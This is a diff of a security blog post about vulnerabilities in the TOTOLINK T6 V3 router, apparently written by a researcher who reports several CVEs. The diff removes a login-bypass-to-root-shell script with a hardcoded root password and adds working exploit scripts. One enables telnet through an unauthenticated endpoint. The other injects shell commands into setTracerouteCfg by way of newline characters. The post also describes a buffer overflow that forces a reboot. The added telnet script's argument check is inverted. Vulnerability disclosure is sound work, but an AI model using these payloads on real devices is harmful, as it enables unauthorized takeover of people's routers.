@@ -1,8 +1,7 @@
 ---
-
 title: 'A journey with TOTOLINK T6 V3'
 published: 2025-06-25
-updated: 2025-07-08
+updated: 2025-07-21
 description: 'This is my journey with this "mesh" !!'
 image: 'pics/device.png'
 tags: ['Blogs', 'IoT', 'Router']
@@ -92,54 +91,31 @@ TBH, I dont know WTF is going on there, but I can guess it will try to parse the
 
 ![](pics/check_authCode.png)
 
-We can manipulate the `authCode` to bypass the login page, then with the same session (they use `timestamps` for this), we can turn on telnet. Lets do it:
+We can manipulate the `authCode` to bypass the login page. Here is the POC:
+
+<video width="640" height="360" controls>
+  <source src="/blogs_file_attached\totolink_t6/poc_bypass.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+</video>
+
+After this, we can go to the `telnet.html` and turn on `telnet` service. Then we can use the known creds to login and get shell.<br>
+Okay thats cool, but we still need to interact with the website to turn on `telnet`. Can we do it with code only ??<br>
+You can see the `setTelnetCfg` doesn't check if the user has privilege or not. So we can write a script and turn it on, we can do it with `HTTP` or `MQTT`, the POC is (`HTTP`):
 
 ```python
-from pwn import *
-import requests, time, sys, os
+import requests, sys
 
 if len(sys.argv) != 2:
-    print("[+] Need device IP !!")
-    exit(0)
+    data = b'''
+    {
+        "topicurl":"setTelnetCfg",
+        "telnet_enabled":"1"
+    }
+    '''
 
-http_sv = "http://%s/" % sys.argv[1]
-url = "formLoginAuth.htm?authCode=1&userName=admin"
-cookie = {"SESSION_ID" : "2:%d:2" % round(time.time())}
-
-bypass_admin_url = http_sv + url
-requests.get(bypass_admin_url, cookies=cookie)
-
-cgi_url = "cgi-bin/cstecgi.cgi"
-payload = """
-    {"telnet_enabled":"1","topicurl":"setTelnetCfg"}
-"""
-
-enable_telnet_url = http_sv + cgi_url
-res = requests.post(enable_telnet_url, data=payload, cookies=cookie)
-
-if res.status_code == 200:
-    print("[+] Telnet enabled !!\n[+] Get shell...")
-
-    sleep(1)
-
-    with remote(sys.argv[1], 23) as r:
-        r.recvuntil(b"login:")
-        r.sendline(b"root")
-
-        r.recvuntil(b"Password:")
-        r.sendline(b"KL@UHeZ0")
-        r.sendline(b"ls")
-
-        # just for test, r.interactive not working on my :(
-        result = r.recvall(timeout=3).splitlines() 
-        for i in result:
-            print(i.decode())
-
-        r.interactive()
-
+    url = f"http://{sys.argv[1]}/cgi-bin/cstecgi.cgi"
+    requests.post(url, data=data)
 ```
-
-![](pics/get_shell.png)
 
 ## Finding bug
 
@@ -161,11 +137,12 @@ In the `main` function, I can see it try to `recvfrom` socket, compare with some
 </video>
 
 ### BOF -> DDOS or ...
+
 We back to `cstecgi.cgi`, in the function at address `0x41f404` (this is the handler for `setLanguageCfg`). First the program parse 2 argv from `POST` request, then it check file `/var/userdata/product.ini` is exist, then the program will create a string from hardcoded string `helpUrl_` and our argv. 
 
 ![](pics/setlangcfg_func.PNG)
 
-But the command_variable on stack only `256` bytes, so we can overflow and overwrite the `ret_addr`. But we cant send `00` bytes, so the only thing we can control is last 3 bytes of `ret_addr`. I tried to find some helpful gadgets to execute system, but I cant find anything (or yet !!). So I decided to return to `0x412acc - RebootSystem`, to make the system reboot. Result:
+But the command_variable on stack only `256` bytes, so we can overflow and overwrite the `ret_addr`. But we cant send `00` bytes, so the only thing we can control is last 3 bytes of `ret_addr`. I tried to find some helpful gadgets to execute system, but I cant find anything (or yet !!). So I decided to return to `0x412acc - RebootSystem`, to make the system reboot. Result:P
 
 <video width="640" height="360" controls>
   <source src="/blogs_file_attached\totolink_t6/ddos.mp4" type="video/mp4">
@@ -195,3 +172,58 @@ The POC took arround `5 - 30` mins to successful exploit and we able to get shel
   <source src="/blogs_file_attached\totolink_t6/poc_bof_brute.mp4" type="video/mp4">
   Your browser does not support the video tag.
 </video>
+
+There are many functions vulnerable to this BOF.
+
+### Command injection
+
+> Credit to [ElvisBlue](https://github.com/ElvisBlue), he found those command injection bug.
+
+We examine `setTracerouteCfg` function. The function look like this:
+
+![](pics/cmd_inject_1.png)
+
+You can see the `uVar1` (`command`) is the param that user send to the server. Then it use `Validiity_Check` on it, this function will check for some string to avoid command injection (but still lol). Here is the check:
+
+![](pics/vali_check.png)
+
+But it forget the "\n" right ? The POC look like this:
+
+```python
+import requests
+
+def execute_command(target_ip, cmd):
+    http_sv = "http://%s/cgi-bin/cstecgi.cgi" % target_ip
+    
+    payload = '''
+    {
+        "topicurl":"setTracerouteCfg",
+        "command":"\\n%s \\n"
+    }
+    ''' % cmd
+    
+    res = requests.post(http_sv, data=payload)
+
+execute_command(target_ip, "rm /tmp/hacked")
+execute_command(target_ip, "echo -n tel >> /tmp/hacked")
+execute_command(target_ip, "echo -n netd >> /tmp/hacked")
+execute_command(target_ip, "chmod +x /tmp/hacked")
+execute_command(target_ip, "/tmp/hacked")
+```
+
+[POC Video](https://www.youtube.com/watch?v=GawLaYfTwYs)
+
+## Final
+
+We already reported everything we found, the accepted CVEs:
+- `CVE-2025-7460` - Buffer Overflow to Command Injection in `setWiFiAclRules`.
+- `CVE-2025-7524` - Command Injection in `setDiagnosisCfg`.
+- `CVE-2025-7525` - Command Injection in `setTracerouteCfg`.
+- `CVE-2025-7613` - Command Injection in `CloudSrvVersionCheck`.
+- `CVE-2025-7614` - Command Injection in `delDevice`.
+- `CVE-2025-7615` - Command Injection in `clearPairCfg`.
+- `CVE-2025-7758` - Buffer Overflow in `setDiagnosisCfg`.
+- `CVE-2025-7837` - Buffer Overflow in `recvSlaveStaInfo`.
+- `CVE-2025-7862` - Missing Authenticate in `setTelnetCfg`.
+- `CVE-2025-7912` - Buffer Overflow in `recvSlaveUpgstatus`.
+- `CVE-2025-7913` - Buffer Overflow in `updateWifiInfo`.
